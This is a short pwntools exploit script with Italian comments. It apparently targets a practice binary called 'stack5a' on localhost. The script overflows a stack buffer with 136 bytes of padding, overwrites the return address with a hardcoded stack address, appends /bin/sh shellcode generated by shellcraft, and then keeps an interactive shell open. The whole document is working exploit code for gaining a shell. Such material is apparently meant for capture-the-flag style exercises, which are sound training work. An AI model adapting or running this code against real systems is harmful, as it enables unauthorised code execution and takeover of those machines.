from pwn import ELF, context, p64, remote, shellcraft, asm

# il coso da eseguire
context.binary = ELF(path="./stack5a")

p = remote(host="localhost", port=4405)

shellcode=shellcraft.sh()

shellcode=asm(shellcode)

p.sendline(b"A" * 136 + p64(0x7fffffffdb18) + b"B"*8 + shellcode) 

# tiene la shell viva
p.interactive()



